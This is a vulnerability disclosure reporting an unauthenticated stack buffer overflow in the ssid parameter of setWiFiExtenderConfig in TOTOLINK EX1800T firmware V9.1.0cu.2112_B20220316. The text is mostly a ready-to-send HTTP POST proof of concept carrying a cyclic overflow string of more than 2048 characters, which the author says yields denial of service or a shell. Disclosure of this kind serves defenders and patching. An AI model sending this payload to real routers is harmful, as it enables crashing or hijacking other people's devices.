# Stack-based Buffer Overflow 04 setWiFiExtenderConfig->ssid

## TOTOLINK EX1800T Stack-based Buffer Overflow Vulnerability

Vendor：Totolink

Product：EX1800T

Firmware：https://www.totolink.net/home/menu/detail/menu\_listtpl/download/id/223/ids/36.html

Affected Version：V9.1.0cu.2112\_B20220316

Class：Stack-based Buffer Overflow

Summary：TOTOLINK EX1800T V9.1.0cu.2112\_B20220316 has a stack-based buffer overflow vulnerability. This vulnerability afferts the setWiFiExtenderConfig interface of the file cstecgi.cgi. The manipulation of the argument 'ssid' leads to buffer overflow. This vulnerability don't need to login, due to insufficient input validation and sanitization, an attacker can exploit this flaw by input malicious data through the ssid field. Successful exploitation allows the attacker to get shell or cause ddos.

## Vulnability Details

In the TOTOLINK EX1800T V9.1.0cu.2112_B20220316 firmware has a Stack-based Buffer Overflow Vulnerability in `setWiFiExtenderConfig`​ Interface, `ssid`​ variable recevies the `ssid`​ parameter:

![image](assets/image-20250305153415-vf0unhs.png)

and then, pass it to the `urlencode`​ function without any length validation check

the `urlencode`​ function will encode the parameter `a1`​ to url encode, and there are no check with the `a1`​'s size validation. Here will occur stack-based buffer overflow when the encode result's size large than 2048. so a malicious attacker can construct the data to be interpreted as DDOS

![image](assets/image-20250305150511-silz4xn.png)

## POC

need length >= 2048

```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.41.184:8885
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset:utf-8
Content-Length: 2359
Origin: http://192.168.41.184:8885
Connection: close
Referer: http://192.168.41.184:8885/page/index.html?timestamp=1741068107856
Priority: u=0

{
"apcliSsid":"",
"apcliBssid":"000",
"apcliAuthMode":"111",
"apcliEncrypType":"111",
"apcliKey":"111",
"apcliChannel":"111",
"ssid":"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaapjaapkaaplaapmaapnaapoaappaapqaapraapsaaptaapuaapvaapwaapxaapyaapzaaqbaaqcaaqdaaqeaaqfaaqgaaqhaaqiaaqjaaqkaaqlaaqmaaqnaaqoaaqpaaqqaaqraaqsaaqtaaquaaqvaaqwaaqxaaqyaaqzaarbaarcaardaareaarfaargaarhaariaarjaarkaarlaarmaarnaaroaarpaarqaarraarsaartaaruaarvaarwaarxaaryaarzaasbaascaasdaaseaasfaasgaashaasiaasjaaskaaslaasmaasnaasoaaspaasqaasraassaastaasuaasvaaswaasxaasyaaszaatbaatcaatdaateaatfaatgaathaatiaatjaatkaatlaatmaatnaatoaatpaatqaatraatsaattaatuaatvaatwaatxaatyaatzaaubaaucaaudaaueaaufaaugaauhaauiaaujaaukaaulaaumaaunaauoaaupaauqaauraausaautaauuaauvaauwaauxaauyaau",
"ssid5g":"111",
"key":"",
"key5g":"111",
"wifiIdx":"1",
"token":"",
"topicurl":"setting/setWiFiExtenderConfig"
}
```

![image](assets/image-20250305153520-tjo2g60.png)

​​

‍
